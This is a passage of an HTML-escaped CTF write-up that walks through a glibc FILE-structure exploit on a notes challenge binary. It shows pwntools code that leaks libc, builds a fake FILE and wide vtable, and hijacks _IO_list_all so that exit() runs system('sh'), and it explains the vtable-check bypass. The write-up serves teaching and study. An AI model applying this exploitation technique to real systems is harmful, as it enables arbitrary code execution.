_wide_vtable\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Finally, we patch the \u003Ccode>_wide_vtable\u003C/code> pointer to point to our fake wide vtable, which we placed at offset \u003Ccode>0x200\u003C/code>. This is the most important pointer, because glibc does \u003Cstrong>not validate\u003C/strong> it. When glibc later calls a wide-character function, it will jump to whatever function pointer we placed there.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-9.png\" alt=\"Fake FILE Structure\">\u003C/p>\n\u003Ch4 id=\"hijacking-_io_list_all\">Hijacking \u003Ccode>_IO_list_all\u003C/code>\u003C/h4>\n\u003Cp>This is the most important step of the whole exploit. Until now, we’ve only \u003Cem>prepared\u003C/em> our fake FILE structure. Now we force glibc to actually \u003Cstrong>use it\u003C/strong>.\u003C/p>\n\u003Cp>glibc keeps a global pointer called \u003Ccode>_IO_list_all\u003C/code>. This pointer is the \u003Cstrong>head of a linked list of all FILE structures\u003C/strong> that exist in the program. When the program exits, glibc walks this list and flushes every file it finds.\u003C/p>\n\u003Cp>Normally, \u003Ccode>_IO_list_all\u003C/code> points to real FILE objects inside libc.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">io_list_all \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> libc.sym[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'_IO_list_all'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">offset \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> io_list_all \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> heap_addr\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">write_note(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, offset, p64(heap_addr))\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">io_list_all \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> libc.sym[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'_IO_list_all'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Now that we know the libc base address, we can compute the \u003Cstrong>exact address\u003C/strong> of \u003Ccode>_IO_list_all\u003C/code> in memory.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">offset \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> io_list_all \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> heap_addr\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Our arbitrary write primitive is relative to the start of our heap note.\r\nSo we calculate how far \u003Ccode>_IO_list_all\u003C/code> is \u003Cstrong>from our heap buffer\u003C/strong>.\u003C/p>\n\u003Cp>This converts an absolute address into a relative offset we can write to.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">write_note(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, offset, p64(heap_addr))\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is the takeover.\u003C/p>\n\u003Cp>We overwrite the value of \u003Ccode>_IO_list_all\u003C/code> so that instead of pointing to real FILE objects, it now points directly to \u003Cstrong>our fake FILE structure on the heap\u003C/strong>.\u003C/p>\n\u003Cp>glibc does \u003Cstrong>not\u003C/strong> check whether \u003Ccode>_IO_list_all\u003C/code> points to a real FILE.\r\nIt blindly trusts the pointer.\u003C/p>\n\u003Cp>So after this write:\u003C/p>\n\u003Cul>\n\u003Cli>glibc believes our fake FILE is a real one\u003C/li>\n\u003Cli>it adds it to the cleanup process\u003C/li>\n\u003Cli>when \u003Ccode>exit()\u003C/code> is called, glibc will process \u003Cem>our\u003C/em> FILE\u003C/li>\n\u003C/ul>\n\u003Cp>\u003Cstrong>Before\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>_IO_list_all → real FILE → real FILE → ...\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>After\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>_IO_list_all → fake FILE (heap) → fake wide_data → fake vtable → system()\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"final-exploit\">final exploit\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> pwn \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">elf \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ELF(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'./notes_patched'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">libc \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ELF(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'./libc.so.6'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">p \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> process(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'./notes_patched'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>What this does:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>ELF()\u003C/code> loads binary information (addresses, symbols, etc.)\u003C/li>\n\u003Cli>\u003Ccode>process()\u003C/code> starts the target program\u003C/li>\n\u003Cli>\u003Ccode>pwn\u003C/code> library handles communication and address packing\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"helper-functions\">Helper Functions\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> create\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(size, content):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'>> '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'1'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)           \u003C/span>\u003Cspan style=\"color:#6A737D\"># Select create option\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'SIZE: '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">str\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(size).encode())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'CHARS): '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, content)   \u003C/span>\u003Cspan style=\"color:#6A737D\"># Send note content\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This function automates creating a note by:\u003C/p>\n\u003Col>\n\u003Cli>Waiting for the menu prompt \u003Ccode>>> \u003C/code>\u003C/li>\n\u003Cli>Sending option \u003Ccode>1\u003C/code> (create)\u003C/li>\n\u003Cli>Sending the size\u003C/li>\n\u003Cli>Sending the content\u003C/li>\n\u003C/ol>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> read_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(idx):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'>> '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'3'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'INDEX: '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">str\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(idx).encode())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.recvuntil(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'NOTE: '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    data \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> p.recvuntil(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'&#x3C; BACK'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">drop\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\">True\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Reads a note and returns its content. \u003Ccode>drop=True\u003C/code> removes the \u003Ccode>&#x3C; BACK\u003C/code> delimiter.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> write_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(idx, offset, content):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'>> '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'4'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'INDEX: '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">str\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(idx).encode())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'INDEX: '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">str\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(offset).encode())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    p.sendlineafter(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'DATA: '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, content)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Writes to a note at a specific offset (the vulnerability!).\u003C/p>\n\u003Ch3 id=\"exploitation\">Exploitation\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Leak libc\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">libc_leak \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> u64(read_note(\u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">).ljust(\u003C/span>\u003Cspan style=\"color:#79B8FF\">8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">libc.address \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> libc_leak \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> libc.sym[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'free'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cul>\n\u003Cli>\u003Ccode>u64()\u003C/code> unpacks 8 bytes to a 64-bit integer\u003C/li>\n\u003Cli>\u003Ccode>ljust(8, b'\\x00')\u003C/code> pads data to 8 bytes\u003C/li>\n\u003Cli>Subtracting \u003Ccode>free\u003C/code> offset gives us libc base\u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Build fake FILE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">fake_file \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flat({\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">00\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"  sh\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x00\\x00\\x00\\x00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">88\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">a0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">c0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">d8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: libc.sym[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'_IO_wfile_jumps'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}, \u003C/span>\u003Cspan style=\"color:#FFAB70\">length\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\">224\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">filler\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Ccode>flat()\u003C/code> creates binary data with values at specific offsets, padding with null bytes.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Patch pointers\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">write_note(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">88\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, p64(heap_addr \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">10\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cul>\n\u003Cli>\u003Ccode>p64()\u003C/code> packs a 64-bit integer to 8 bytes (little-endian)\u003C/li>\n\u003Cli>Overwrites the \u003Ccode>_lock\u003C/code> field at offset 0x88\u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Hijack _IO_list_all\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">offset \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> io_list_all \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> heap_addr\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">write_note(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, offset, p64(heap_addr))\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Uses the arbitrary relative write to overwrite \u003Ccode>_IO_list_all\u003C/code> in libc!\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"why-this-works\">Why This Works\u003C/h2>\n\u003Ch3 id=\"the-glibc-call-chain\">The glibc Call Chain\u003C/h3>\n\u003Cp>When you exit, glibc does this:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// In elf/dl-fini.c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">exit\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    _IO_cleanup\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// In libio/genops.c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">_IO_cleanup\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> _IO_flush_all_lockp\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// In libio/genops.c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">_IO_flush_all_lockp\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">fp;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Iterate the chain!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (fp \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_list_all; fp \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; fp \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fp->_chain) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // Check if buffer needs flushing\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (fp->_IO_write_ptr \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fp->_IO_write_base) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            // Call overflow from vtable\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (fp->_mode \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">                // Normal mode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                _IO_overflow\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(fp, EOF);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            } \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">                // Wide mode (our case!)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                _IO_wfile_overflow\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(fp, WEOF);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// In libio/wfileops.c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">_IO_wfile_overflow\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Check vtable (VALIDATED ✓)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    _IO_vtable_check\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(fp->vtable);\u003C/span>\u003Cspan style=\"color:#6A737D\">  // Passes! We use _IO_wfile_jumps\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Eventually calls:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    fp->_wide_data->_wide_vtable->\u003C/span>\u003Cspan style=\"color:#B392F0\">doallocate\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(fp);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // ↑ NOT VALIDATED ✗\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"the-bypass\">The Bypass\u003C/h3>\n\u003Cp>\u003Cstrong>glibc’s protection:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" 